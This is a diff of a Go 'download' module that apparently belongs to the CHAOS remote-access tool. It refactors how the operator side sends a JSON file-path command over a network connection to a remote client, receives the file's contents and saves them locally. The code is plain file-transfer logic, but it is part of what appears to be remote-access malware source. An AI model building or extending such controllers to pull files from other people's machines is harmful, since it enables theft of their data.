@@ -1,7 +1,10 @@
 package download
 
 import (
+	"encoding/json"
 	"fmt"
+	log "github.com/sirupsen/logrus"
+	"github.com/tiagorlampert/CHAOS/internal/models"
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	osUtil "github.com/tiagorlampert/CHAOS/internal/util/os"
@@ -22,50 +25,53 @@ func NewDownloadUseCase(conn net.Conn) usecase.Download {
 	}
 }
 
-func (d DownloadUseCase) Validate(param []string) {
-	if len(param) != 2 {
+func (d DownloadUseCase) Validate(param []string) error {
+	if len(param) != 2 || !util.Contains(param, "download") {
 		fmt.Println(c.Yellow, "[!] Invalid parameters to download!")
+		return fmt.Errorf("invalid parameters")
+	}
+	return nil
+}
+
+func (d DownloadUseCase) File(filepath string) {
+	download, err := json.Marshal(models.Download{
+		Filepath: filepath,
+	})
+	if err != nil {
+		log.Error(err)
+	}
+
+	err = network.Send(d.Connection, models.Message{
+		Command: "download",
+		Data:    download,
+	})
+	if err != nil {
+		log.WithField("cause", err.Error()).Error("error sending request")
 		return
 	}
-}
 
-func (d DownloadUseCase) Prepare(command string) {
-	err := network.Send(d.Connection, []byte(command))
+	response, err := network.Read(d.Connection)
 	if err != nil {
-		fmt.Println(c.Red, "[!] Error sending download request!")
+		fmt.Println(c.Red, "[!] Error receiving response!")
+		return
 	}
 
-	message, err := network.Read(d.Connection)
-	if err != nil {
-		fmt.Println(c.Red, "[!] Error receiving download confirmation!")
+	if response.Error.HasError {
+		fmt.Println(c.Red, "[!] Error processing file!", response.Error.Message)
+		return
 	}
-	fmt.Println(message)
-}
-
-func (d DownloadUseCase) ReceiveFile(path string) {
-	// Send path
-	err := network.Send(d.Connection, []byte(path))
-	if err != nil {
-		fmt.Println(c.Red, "[!] Error sending path!")
-	}
-
-	// Read data
-	data, err := network.Read(d.Connection)
-	if err != nil {
-		fmt.Println(c.Red, "[!] Error receiving data!")
-	}
-
-	if len(data) == 0 {
+	if len(response.Data) == 0 {
 		fmt.Println(c.Yellow, "[!] Specified file not found or empty!")
 		return
 	}
 
-	filename := buildFilename(path)
-	if err := osUtil.WriteFile(filename, data); err != nil {
+	filename := buildFilename(filepath)
+	if err := osUtil.WriteFile(filename, response.Data); err != nil {
 		fmt.Println(c.Red, "[!] Error saving file!")
 		return
 	}
-	fmt.Println(c.Green, fmt.Sprintf("[i] ReceiveFile saved successfully at %s!", filename))
+
+	fmt.Println(c.Green, fmt.Sprintf("[*] File saved successfully at %s!", filename))
 }
 
 func buildFilename(path string) string {
